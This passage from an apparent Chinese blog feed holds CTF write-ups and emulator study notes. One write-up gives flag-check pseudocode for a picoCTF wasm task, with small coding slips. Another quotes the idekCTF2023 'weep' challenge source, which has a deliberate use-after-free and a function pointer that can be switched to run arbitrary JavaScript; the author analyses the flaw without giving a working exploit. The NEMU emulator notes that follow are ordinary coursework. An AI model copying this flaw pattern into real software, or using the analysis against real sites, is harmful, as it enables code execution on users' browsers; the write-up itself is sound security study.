src="/2023/01/19/wasm-pwn/image-20230118160914194.png" alt="image-20230118160914194"></p><p>首先根据while循环猜测下标应该被存放在(v0+12)里面，并且每组是加上一个int大小，说明迭代器可能是int类型。字符串应该被放在v1+1072位置上。在循环内部首先根据下标v0取出这个值，然后把+1072位置亦或上0x14，也就是str[i]^0x14。</p><p>接下来判断这个下标如果大于0，就把下标对应的内容与这个字符串上一个内容亦或，也就是str[i] = str[i] ^ str[i-1]</p><p>然后判断如果下标大于2，就str[i] = str[i] ^ str[i-3]。这一步和上一步不矛盾，可以同时发生。</p><p>接下来str[i] = (i%10)^str[i]</p><p>在接下来根据下标为偶数或者奇数分别亦或不同的数字。其实到这里已经很清晰了。我们写一个<code>check_flag()</code>的代码。首先找到0x400地方的加密数据(这里我不太熟悉JEB数据提取，所以一个一个手动输入的)</p><p><img src="/2023/01/19/wasm-pwn/image-20230118205554272.png" alt="image-20230118205554272"></p><p>那么我们不难写出伪代码。下面的change_arget对应将答案数组中元素两两交换的结果。或者我们直接在这里得到的结果中交换也是可以的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查字符串的伪代码</span></span><br><span class="line"><span class="built_in">str</span> = []</span><br><span class="line">change_target = []</span><br><span class="line">target = [<span class="number">0x18</span>,<span class="number">0x6a</span>,<span class="number">0x7c</span>,<span class="number">0x61</span>,<span class="number">0x11</span>,<span class="number">0x38</span>,<span class="number">0x69</span>,<span class="number">0x37</span>,<span class="number">0x5b</span>,<span class="number">0x48</span>,<span class="number">0x7e</span>,<span class="number">0x4a</span>,<span class="number">0x68</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>,<span class="number">0x6f</span>,<span class="number">0x1f</span>,<span class="number">0x5d</span>,<span class="number">0x5c</span>,<span class="number">0x77</span>,<span class="number">0x34</span>,<span class="number">0x6b</span>,<span class="number">0x50</span>,<span class="number">0x15</span>,<span class="number">0x70</span>,<span class="number">0x4f</span>,<span class="number">0x3f</span>,<span class="number">0x5c</span>,<span class="number">0x45</span>,<span class="number">0x6f</span>,<span class="number">0x14</span>,<span class="number">0x6</span>,<span class="number">0x5</span>,<span class="number">0x7d</span>,<span class="number">0x3e</span>,<span class="number">0x3d</span>,<span class="number">0x4</span>,<span class="number">0x16</span>,<span class="number">0x2e</span>,<span class="number">0x12</span>,<span class="number">0x4c</span>]</span><br><span class="line"><span class="comment"># print(len(target))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkflag</span>():</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x14</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt; <span class="built_in">len</span>(target)):</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i - <span class="number">1</span>]^ <span class="built_in">str</span>[i]</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">2</span>):</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i - <span class="number">3</span>]^<span class="built_in">str</span>[i]</span><br><span class="line">        <span class="built_in">str</span>[i] = (i%<span class="number">10</span>) ^ <span class="built_in">str</span>[i]</span><br><span class="line">        <span class="keyword">if</span>((i%<span class="number">2</span>) == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x9</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x8</span></span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x7</span></span><br><span class="line">        <span class="keyword">elif</span>(i%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x6</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">str</span>[i] = <span class="built_in">str</span>[i] ^ <span class="number">0x5</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 第二轮,数据交换</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(j&lt;i):</span><br><span class="line">        <span class="keyword">if</span>((j%<span class="number">2</span>) == <span class="number">0</span> <span class="keyword">and</span> (j+<span class="number">1</span> &lt; i)):</span><br><span class="line">            tmp = <span class="built_in">str</span>[j]</span><br><span class="line">            <span class="built_in">str</span>[j] = <span class="built_in">str</span>[j+<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">str</span>[j+<span class="number">1</span>] = tmp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">already = <span class="string">r&quot;picoCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查下标为i的单个字符的正确性，用于爆破</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_chr</span>(<span class="params">i,ch</span>):</span><br><span class="line">    <span class="comment"># check if `ch` is right</span></span><br><span class="line">    ch = <span class="built_in">ord</span>(ch)^<span class="number">0x14</span></span><br><span class="line">    <span class="keyword">if</span>(i&gt;<span class="number">0</span>):</span><br><span class="line">        ch = <span class="built_in">ord</span>(already[i - <span class="number">1</span>])^ch</span><br><span class="line">    <span class="keyword">if</span>(i&gt;<span class="number">2</span>):</span><br><span class="line">        ch = <span class="built_in">ord</span>(already[i - <span class="number">3</span>])^ch</span><br><span class="line">    ch = ((i % <span class="number">10</span>) ^ ch)</span><br><span class="line">    <span class="keyword">if</span>((i%<span class="number">2</span>) == <span class="number">0</span>):</span><br><span class="line">        ch = ch ^ <span class="number">0x9</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ch = ch ^ <span class="number">0x8</span></span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        ch = ch ^ <span class="number">0x7</span></span><br><span class="line">    <span class="keyword">elif</span>(ch % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        ch = ch ^ <span class="number">0x6</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ch = ch ^ <span class="number">0x5</span></span><br><span class="line">    <span class="keyword">if</span>(ch == change_target[i]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>由于每个字符可以单独尝试，每个字符只依赖于以前的字符，因此可以逐个爆破。有意我们知道这个比赛flag开头部分为<code>picoctf&#123;</code>因此可以很方便的得到结果。或者使用z3也可以。</p><h2 id="idekCTF2023-weep"><a href="#idekCTF2023-weep" class="headerlink" title="idekCTF2023 weep"></a>idekCTF2023 weep</h2><p>这道题给了源码，不用我们自己去逆向了。远程访问内容是一个带有输入框的页面。<a href="https://github.com/Nicholas-wei/pwn/tree/main/idekctf">附件</a></p><p>下载之后使用docker下载环境。需要注意一般wasm都是statically linked的，也就是说往往我们需要手动去逆向一下题目所给的文件使用的库函数。当然在这方面出题也是可以的。比如使用一些自己写的动态库，然后找到存在的问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build ./Dockerfile .</span><br></pre></td></tr></table></figure><p>得到的网页内容</p><p><img src="/2023/01/19/wasm-pwn/image-20230118123810458.png" alt="image-20230118123810458"></p><p>来分析一下给的源码。是一个比较明显的UAF漏洞。首先是数据结构。表示了一个name的长度和内容。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Title</span> &#123;</span><br><span class="line"><span class="type">char</span>* name;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来的操作分别对应于上面勾选框的操作。其中在delete时没有删去titles[idx]对应的index。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= MAX_TITLES) <span class="keyword">return</span>;</span><br><span class="line">titles[idx].len = <span class="built_in">strlen</span>(name);</span><br><span class="line">titles[idx].name = strdup(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= MAX_TITLES) <span class="keyword">return</span>;</span><br><span class="line"><span class="built_in">free</span>(titles[idx].name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> idx, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= MAX_TITLES) <span class="keyword">return</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(titles[idx].name, name, titles[idx].len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">greet</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= MAX_TITLES) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(numCalls &gt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">numCalls++;</span><br><span class="line">title_fp(titles[idx].name); <span class="comment">// 这是一个函数指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setTitle</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(val) title_fp = mrTitle;</span><br><span class="line"><span class="keyword">else</span> title_fp = mrsTitle;</span><br><span class="line"><span class="keyword">if</span>((<span class="type">long</span> <span class="type">long</span>)val == <span class="number">0x1337133713371337</span>) title_fp = emscripten_run_script;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意title_fp()是一个函数指针。在初始化的时候，指向以下内容。其中有一个函数<code>emscripten_run_script(jscode)</code>可以参考<a href="https://www.cntofu.com/book/150/zh/ch2-c-js/ch2-06-run-script.md">此网站</a>。简单来说，就是接受js字符串并执行的，类似于system()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mrTitle</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name)</span>&#123;</span><br><span class="line"><span class="type">char</span> jsCode[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(jsCode, <span class="string">&quot;alert(\&quot;Mr.%.10s\&quot;)&quot;</span>, name);</span><br><span class="line">emscripten_run_script(jsCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mrsTitle</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name)</span>&#123;</span><br><span class="line"><span class="type">char</span> jsCode[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(jsCode, <span class="string">&quot;alert(\&quot;Mrs.%.10s\&quot;)&quot;</span>, name);</span><br><span class="line">emscripten_run_script(jsCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化函数指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Title</span> <span class="title">titles</span>[<span class="title">MAX_TITLES</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> numCalls = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> (*title_fp)(<span class="type">const</span> <span class="type">char</span>*) = mrTitle;</span><br></pre></td></tr></table></figure><p>注意到setTitle()里面，如果val等于一个特殊数字，似乎就能直接修改掉函数指针，执行我们名字对应的内容。难道直接发送<code>0x1337133713371337</code>就可以有类似system()权限吗？应该是，但是还需要控制对应的js代码。但是我连js获取信息的payload也不太清楚。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在<code>delete</code>中，可以找到<code>free()</code>函数，查看反编译，是一种类似<a href="https://github.com/ARMmbed/dlmalloc/blob/master/source/dlmalloc.c#L4720">dlmalloc</a>的free操作。在上面已经介绍过如何调试了。</p><p>关于如何expolit，需要先了解chrome pwn相关内容</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wasm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ics-pa</title>
      <link href="/2022/12/27/ics-pa1/"/>
      <url>/2022/12/27/ics-pa1/</url>
      
        <content type="html"><![CDATA[<p>好久好久之前就想做的ics-pa，在毕业之前一定可以尝试一下！那么就从这个寒假开始吧<br>感谢南大</p><p>但是本篇记录的不是很完整，比较零碎</p><span id="more"></span><h1 id="preparations"><a href="#preparations" class="headerlink" title="preparations"></a>preparations</h1><p>需要安装一个ubuntu22.04，算了，新装一个虚拟机吧。</p><p>vim相对行之间的跳转</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用比如 7j 和 7k 向下或者向上移动 7 行</span><br></pre></td></tr></table></figure><h1 id="PA1"><a href="#PA1" class="headerlink" title="PA1"></a>PA1</h1><h2 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h2><p>（这个东西的意思时read the fxxk source code的意思，我还以为是什么基础设施的意思）</p><p>这个里面提到，我们的NEMU啊，是一个用来运行用户代码的程序，但是把客户代码读入NEMU，是通过所谓的monitor完成的。于是我们可以看看NEMU的monitor/monitor.c的源代码。下面是一些例子</p><ul><li>rand.c。位于/nemu/src/utils/rand.c下</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;common.h&gt;</span>                             </span></span><br><span class="line"><span class="number">16</span> <span class="meta">#<span class="keyword">ifndef</span> CONFIG_TARGET_AM                             </span></span><br><span class="line"><span class="number">17</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span>                            </span></span><br><span class="line"><span class="number">18</span> <span class="meta">#<span class="keyword">endif</span>                             </span></span><br><span class="line"><span class="number">20</span> <span class="type">void</span> <span class="title function_">init_rand</span><span class="params">()</span> &#123;                               </span><br><span class="line"><span class="number">21</span>   srand(MUXDEF(CONFIG_TARGET_AM, <span class="number">0</span>, time(<span class="number">0</span>)));                              </span><br><span class="line"><span class="number">22</span> &#125;  </span><br></pre></td></tr></table></figure><ul><li>init_mem()初始化了一块malloc出来的内存，里面存放了一些随机数，并且用这些内容作为所谓的physical memory。位于<code>nemu/src/memory/paddr.c</code>下。</li></ul><p><img src="/2022/12/27/ics-pa1/image-20221227161624376.png" alt="image-20221227161624376"></p><ul><li>ISA。关于ISA其实挺迷惑的。目前还没有说可以在哪里指定写x86或者别的指令集。在官网上也没有找到x86的??算了，就尝试一下riscv32吧，也算是跨越舒适区。在<code>init_isa()</code>中，代码非常简短</li></ul><p><img src="/2022/12/27/ics-pa1/image-20221228110847355.png" alt="image-20221228110847355"></p><p>根据文档里的说明，这里RESET_VECTOR是monitor直接把客户程序读入到一个固定的内存位置的地方，然后restart让cpu.pc指向这个RESET_VECTOR。这里做了一个memcpy，把一部分指令读入到RESET VECTOR的开头。暂时还不太清楚是什么意思。在官方文档上查到内容如下。</p><blockquote><p>lui: load upper immediate，表示使用无符号数字形式构造一个常量。这里就是t0=0x80000</p><p>sw: store word, 注意：sw src, off(dst) =&gt; M[dst + off] = src[31:0]。所以这里也就是把0x80000的地方写入0。这里的地址映射是通过paddr.c中guest_to_host实现的。实现的非常简单。其实应该就是做加减之后在mmap出来的一部分内存中使用。</p><p>lw: load word。也就是读入a0=0。</p><p>ebreak: 可能是一个中断trap。</p></blockquote><p>所以这段代码就是简单的测试了一下内容访问和读取，就转交控制权了。</p><p>顺便看一下这个模拟的CPU的格式。对于riscv32，只有一个pc，还有32个word大小的寄存器组合。</p><p><img src="/2022/12/27/ics-pa1/image-20221228112011498.png" alt="image-20221228112011498"></p><p>之后，NEMU调用load_img()把指定的客户img读入内存，如下图。也是非常简单，相当于二进制读文件到RESET_VECTOR中。</p><p><img src="/2022/12/27/ics-pa1/image-20221228112652781.png" alt="image-20221228112652781"></p><p>之后就make就行了。期间遇到这个错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Makefile:18: *** NEMU_HOME= is not a NEMU repo.  Stop.</span><br></pre></td></tr></table></figure><p>改正方式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export NEMU_HOME=/home/nicholas/Desktop/ics-pa/nemu</span><br></pre></td></tr></table></figure><p>收获一个welcome()的截图</p><p><img src="/2022/12/27/ics-pa1/image-20221228114517414.png" alt="image-20221228114517414"></p><p>我们来看看，关于这个(nemu)的提示，该怎么解释。根据官网提示，主要在sdb_mainloop()中，输出的hint，以及主循环部分。下面显然是读取标准输入，并解析和分割命令的部分。(但是好像没找到nemu提示符在哪里)</p><p><img src="/2022/12/27/ics-pa1/image-20221228114659340.png" alt="image-20221228114659340"></p><p>之后如果输入”c”,NEMU开始进入指令执行的主循环<code>cpu_exec()</code>。一共有以下几种命令。</p><p><img src="/2022/12/27/ics-pa1/image-20221228121938972.png" alt="image-20221228121938972"></p><p>很简单的，看到cpu_exec中，指令的含义。就是调用execute()执行代码，并且获取状态值。</p><p><img src="/2022/12/27/ics-pa1/image-20221228122223675.png" alt="image-20221228122223675"></p><p>而execute()如下所示</p><p><img src="/2022/12/27/ics-pa1/image-20221228122315893.png" alt="image-20221228122315893"></p><p>又调用了exec_once()这里调用isa_exec_once()估计才是真正让指令集工作的地方。然后应该是输出了一些状态信息。我们可以调试一下看看。</p><p><img src="/2022/12/27/ics-pa1/image-20221228122507451.png" alt="image-20221228122507451"></p><p>这边传入-1是因为-1转为uint之后非常大，会让CPU一直执行下去。</p><p>这里还发现一个对于调试特别有用的，TUI工具。是gdb自带的。<code>layout split</code>即可使用。可以同时显示源代码和汇编。非常方便。</p><p>如果在make menuconfig中打开调试，则zuto.conf中就会出现CONFIG_CC_DEBUG=y</p><h3 id="添加exit代码"><a href="#添加exit代码" class="headerlink" title="添加exit代码"></a>添加exit代码</h3><p>在cmd_q中加一行输出，看看是怎么调用到cmd_q的。因为下面结构体中传入了函数指针。注意handler结构，是一个函数指针。</p><p><img src="/2022/12/27/ics-pa1/image-20221228132041843.png" alt="image-20221228132041843"></p><p>而在下面比对的时候，发现找到一个名称一致的，就去把对应的handler拿出来执行，并判断返回值是否小于0。小于0就return。那么是谁调用了sbd_mainloop()呢？答案在nemu/src/engine/interpreter/init.c中</p><p><img src="/2022/12/27/ics-pa1/image-20221228132145170.png" alt="image-20221228132145170"></p><p><img src="/2022/12/27/ics-pa1/image-20221228132628859.png" alt="image-20221228132628859"></p><p>而main()调用engine start.（nemu-main.c）</p><p><img src="/2022/12/27/ics-pa1/image-20221228133818479.png" alt="image-20221228133818479"></p><p><img src="/2022/12/27/ics-pa1/image-20221228134007776.png" alt="image-20221228134007776"></p><p>然后我们只要去改掉NEMU_QUIT就可以了。使用`grep -rn “words” *可以在当前目录下递归搜索文件中的字符串。但是貌似这个只是执行代码的时候才会设置的。因此最好的办法是给engine_start加上一个返回值吧。改几个函数签名就行了。(直接exit(-1))也可以，但是最好不要这样。</p><p><img src="/2022/12/27/ics-pa1/image-20221228135632538.png" alt="image-20221228135632538"></p><h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>这里需要实现三个：单步执行、打印寄存器、扫描内存三个调试用API。</p><p>注意可以用nemu/include/debug.h中的API进行调试</p><h3 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h3><p><img src="/2022/12/27/ics-pa1/image-20221228141605848.png" alt="image-20221228141605848"></p><h3 id="打印寄存器"><a href="#打印寄存器" class="headerlink" title="打印寄存器"></a>打印寄存器</h3><p>这个只需要把对应寄存器内容打出来就可以了。主要是去改src/isa/riscv32下的reg.c文件。需要用到两个函数。第一个是把下标转换成名字。对于riscv，一共有32个寄存器。</p><p><img src="/2022/12/27/ics-pa1/image-20221228143417178.png" alt="image-20221228143417178"></p><p>另一个是gpr()，直接获取了寄存器的值。</p><p>由于word_t是uint_16，因此输出内容用到的格式化字符串为hd，或者也可以十六进制打印，hx</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PRIu8 <span class="string">&quot;hu&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRId8 <span class="string">&quot;hd&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIx8 <span class="string">&quot;hx&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIu16 <span class="string">&quot;hu&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRId16 <span class="string">&quot;hd&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIx16 <span class="string">&quot;hx&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIu32 <span class="string">&quot;u&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRId32 <span class="string">&quot;d&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIx32 <span class="string">&quot;x&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIu64 <span class="string">&quot;llu&quot;</span> <span class="comment">// or possibly &quot;lu&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRId64 <span class="string">&quot;lld&quot;</span> <span class="comment">// or possibly &quot;ld&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIx64 <span class="string">&quot;llx&quot;</span> <span class="comment">// or possibly &quot;lx&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="扫描内存"><a href="#扫描内存" class="headerlink" title="扫描内存"></a>扫描内存</h3><p>命令格式如下</p><p><img src="/2022/12/27/ics-pa1/image-20221228145609605.png" alt="image-20221228145609605"></p><p>首先需要知道内存存在什么位置，应该是上文pmem()。但是为了虚拟地址和真实地址转换，需要通过一些映射。也就是<code>guest_to_host</code>和<code>host_to_guest</code>。</p><p>用到两个最重要的交互函数</p><p><img src="/2022/12/27/ics-pa1/image-20221228154834007.png" alt="image-20221228154834007"></p><p><img src="/2022/12/27/ics-pa1/image-20221228193026436.png" alt="image-20221228193026436"></p><p>因此代码如下</p><p><img src="/2022/12/27/ics-pa1/image-20221228195745063.png" alt="image-20221228195745063"></p><h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p><img src="/2022/12/27/ics-pa1/image-20221228215357311.png" alt="image-20221228215357311"></p><p>测试了一下上述三个功能，都还不错。第一部分完结啦</p><p><img src="/2022/12/27/ics-pa1/image-20221228195830109.png" alt="image-20221228195830109"></p><h1 id="PA2"><a href="#PA2" class="headerlink" title="PA2"></a>PA2</h1><p><code>decode_operand</code>中用到了宏<code>BITS</code>和<code>SEXT</code>, 它们均在<code>nemu/include/macro.h</code>中定义, 分别用于位抽取和符号扩展</p><p>decode_operand在nemu/src/isa/riscv32/inst.c中</p><p>INSTPAT等宏展开在nemu/include/cpu/decode.h中</p><p>decode-exec在src/isa/riscv32/inst.c中，但是好像无法正常解析</p><p>exec_once在nemu/src/cpu/cpu-exec.c中</p><p>inst_fetch在</p><h2 id="一条指令在NEMU的执行过程"><a href="#一条指令在NEMU的执行过程" class="headerlink" title="一条指令在NEMU的执行过程"></a>一条指令在NEMU的执行过程</h2><p>首先，指令被放在INITIAL_VECTOR中，首先进入execute(cpu-exec.c)里面。execute会调用exec_once函数，之后exec_once会设置PC和snpc，去调用isa_exec_once，并传入一个参数Decode*。</p><p>之后到了inst.c的isa_exec_once中，它会调用ifetch从INITIAL_VECTOR取出指令，这其实就是从INITIAL_VECTOR对应的虚拟地址映射到的物理地址上取出四个字节作为指令。之后会调用decode_exec()。在这里，指令将被解码和模拟执行。</p><p>使用INSTPAT()宏来模拟CPU对于一个32-bit指令的匹配，格式如下。其中?代表0或者1，其余的是确定的比特。这一部分其实是译码和执行部分加起来。</p><p><img src="/2022/12/27/ics-pa1/image-20230102094304705.png" alt="image-20230102094304705"></p><p>其中INSTPAT宏的展开在nemu/include/cpu/decode.h中。尝试过gcc -E展开，但是发现效果并不好，遂放弃。实际上INSTPAT的意思就是通过对上述规则的每个字符进行匹配，然后根据RISCV的特点，找到源寄存器，目标寄存器一类的，再用C代码模拟执行这条指令。</p><p><img src="/2022/12/27/ics-pa1/image-20230102094622099.png" alt="image-20230102094622099"></p><p><img src="/2022/12/27/ics-pa1/image-20230102140007605.png" alt="image-20230102140007605"></p><p><img src="/2022/12/27/ics-pa1/image-20230102094549034.png" alt="image-20230102094549034"></p><p>然后把保存下来的内容放在key、mask、shift里面。调用decode_operand完成c语言中执行的操作。</p><p><img src="/2022/12/27/ics-pa1/image-20230102130209094.png" alt="image-20230102130209094"></p><p>我们要做的呢，实际上就是为INSTPAT()添加其他指令的对应匹配过程，并且在decode_operand中加上处理行为即可。使用的测试程序是dummy.c。反编译出来的内容如下。</p><p><img src="/2022/12/27/ics-pa1/image-20230102140107148.png" alt="image-20230102140107148"></p><p>先对照原先就有的一些指令理解一下下面是来自riscv volumn1的第19页，关于lui指令格式的介绍。对照着NEMU中的格式（这里的空格好奇怪）</p><p><img src="/2022/12/27/ics-pa1/image-20230102142345923.png" alt="image-20230102142345923"></p><p><img src="/2022/12/27/ics-pa1/image-20230102142255932.png" alt="image-20230102142255932"></p><p>可以看到除了最后7个bit是固定的之外，其余都是不确定的。但是最后7个bit结合type指定了指令内容。如下所示</p><p><img src="/2022/12/27/ics-pa1/image-20230102193707988.png" alt="image-20230102193707988"></p><p>现在尝试加一个addi进去，网上找到一张特别有用的图。<a 